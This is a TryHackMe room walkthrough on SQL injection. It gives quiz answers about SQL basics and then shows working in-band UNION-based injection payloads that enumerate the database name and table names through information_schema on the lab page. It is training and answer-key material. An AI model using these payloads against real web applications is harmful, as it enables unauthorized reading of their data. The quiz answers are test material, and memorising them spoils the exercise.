<h1 align='center'>:fire: TryHackMe SQL Injection room :fire: </h1>

![show image](images/1-show.png)<br/>
[SQL Injection Room](https://tryhackme.com/room/sqlinjectionlm)


## Task 1: Breif
### Q: What does SQL stand for?
![what does](images/2-what-does.png)<br/>
#### A: `Structured Query Language` :heavy_check_mark:<br/>

## Task 2: What is database?
### Q: What is the acronym for the software that controls a database?
![dbms](images/3.png)<br/>
#### A: `DBMS` :heavy_check_mark:<br/>

### Q: What is the name of the grid-like structure which holds the data?
![table](images/4-table.png)<br/>
#### A: `table` :heavy_check_mark:<br/>

## Task 3: What is SQL?
### Q: What SQL statement is used to retrieve data?
![select](images/5-select.png)<br/>
#### A: `SELECT` :heavy_check_mark:<br/>

### Q: What SQL clause can be used to retrieve data from multiple tables?
![union](images/6-union.png)<br/>
#### A: `UNION` :heavy_check_mark:<br/>

### Q: What SQL statement is used to add data?
![insert](images/7-insert.png)<br/>
#### A: `INSERT` :heavy_check_mark:<br/>

## Task 4: What is SQL Injection?
### Q: What character signifies the end of an SQL query?
![semicolon](images/8-semicolon.png)<br/>
#### A: `;` :heavy_check_mark:<br/>

## Task 5: In-Band SQLi
### Q: What is the flag after completing level 1?
    '
![apostrophe](images/9-apostrophe.png)<br/>
Try typing an apostrophe `'` after the `id=1` and press enter. And you'll see this returns an SQL error informing you of an error in your syntax.<br/>

    1 UNION SELECT 1,2,3
![error solved](images/10-error-solved.png)<br/>
Success,  the error message has gone, and the article is being displayed, but now  we want to display our data instead of the article.<br/>

Now change value `1` to `0` before UNION

    0 UNION SELECT 1,2,3
![change value](images/11-change-value.png)<br/>
You'll now see the article is just made up of the result from the UNION select returning the column values `1, 2, and 3`<br/>

    0 UNION SELECT 1,2,database()
![datanase](images/12-database.png)<br/>
It now shows the name of the database, which is `sqli_one`.<br/>

    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
![tables name](images/13-get-tables-name.png)<br/>
The information we want to retrieve has changed from table_name to `column_name`, the table we are querying in the information_schema database has changed from tables to `columns`, and we're searching for any rows where the `table_name` column has a value of `staff_users`.<br/>